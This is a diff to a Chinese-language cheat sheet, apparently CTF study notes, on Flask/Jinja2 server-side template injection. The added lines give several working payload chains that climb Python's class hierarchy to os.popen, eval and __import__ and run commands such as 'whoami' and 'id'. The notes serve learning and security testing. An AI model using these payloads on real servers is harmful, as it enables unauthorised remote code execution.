@@ -28,6 +28,7 @@ request.json		 post传json  (Content-Type: application/json)
 config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
 g                    {{g}}得到<flask.g of 'flask_ssti'>
 ```
+
 ^
 ## **利用链**
 直接使用popen（python2不行）
@@ -37,7 +38,29 @@ os._wrap_close 类里有popen
 "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
 "".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
 ```
+使用os下的popen
+```
+含有 os 的基类都可以，如 linecache
 
+"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
+```
+
+使用__import__下的os（python2不行)
+```
+可以使用 __import__ 的 os
+
+"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()
+```
+
+__builtins__下的多个函数
+```
+__builtins__下有eval，__import__等的函数，可以利用此来执行命令
+
+"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
+"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
+"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
+"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
+```
 
 ^
 ## **绕过基础**
